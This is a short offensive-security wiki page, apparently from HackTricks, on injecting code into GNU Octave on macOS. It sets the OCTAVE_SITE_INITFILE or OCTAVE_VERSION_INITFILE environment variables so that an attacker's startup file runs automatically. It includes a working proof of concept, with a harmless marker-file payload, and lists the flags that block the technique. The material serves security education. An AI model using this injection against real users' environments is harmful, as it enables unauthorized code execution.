# macOS GNU Octave Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave executes several files containing valid Octave commands during startup. `OCTAVE_SITE_INITFILE` overrides the site-wide startup file and `OCTAVE_VERSION_INITFILE` overrides the version-specific one, allowing either variable to redirect automatic execution to an attacker-readable file.<sup>[[1]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` only skips user files such as `~/.octaverc`; it does **not** stop the site-file override above. Use `--no-site-file` for the site files or `--norc` / `-f` to disable all startup files.<sup>[[2]](#references)</sup>

## References

- [1] [GNU Octave Startup Files](https://docs.octave.org/latest/Startup-Files.html)
- [2] [GNU Octave Command Line Options](https://docs.octave.org/latest/Command-Line-Options.html)

{{#include ../../../banners/hacktricks-training.md}}
